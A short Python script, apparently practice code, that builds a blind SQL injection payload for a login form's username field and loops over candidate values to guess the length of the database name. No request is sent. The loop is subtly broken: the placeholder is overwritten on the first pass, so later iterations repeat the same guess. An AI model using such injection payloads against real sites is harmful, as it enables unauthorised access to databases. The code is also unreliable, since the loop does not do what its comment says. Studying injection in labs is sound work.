# coding:utf-8
data1 = {
        'uname': "' or length(database())={}#",
        'passwd': ''
    }

print(data1['uname'].format(8))
for DBNameLen in range(8, 10):
    # 对payload的中的参数进行赋值猜解
    data1['uname'] = data1['uname'].format(DBNameLen)
    print(data1['uname'])